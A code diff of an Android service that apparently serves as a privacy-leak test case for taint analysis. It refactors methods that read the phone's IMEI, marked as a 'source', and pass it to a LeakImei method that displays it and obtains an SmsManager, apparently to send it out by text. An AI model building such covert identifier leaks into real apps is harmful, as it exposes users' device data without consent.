@@ -17,7 +17,7 @@ import android.widget.Toast;
 
 public class ServClass extends Service {
 
-    private static String imei = null;
+
     IBinder mBinder = new LocalBinder();
 
     @Override
@@ -30,12 +30,13 @@ public class ServClass extends Service {
             return ServClass.this;
         }
     }
-    public void obtainImei()
+    public String obtainImei()
     {
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        imei = telephonyManager.getDeviceId(); //source
+        String imei = telephonyManager.getDeviceId(); //source
+        return imei;
     }
-    public void LeakImei()
+    public void LeakImei(String imei)
     {
         Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
         SmsManager sms = SmsManager.getDefault();
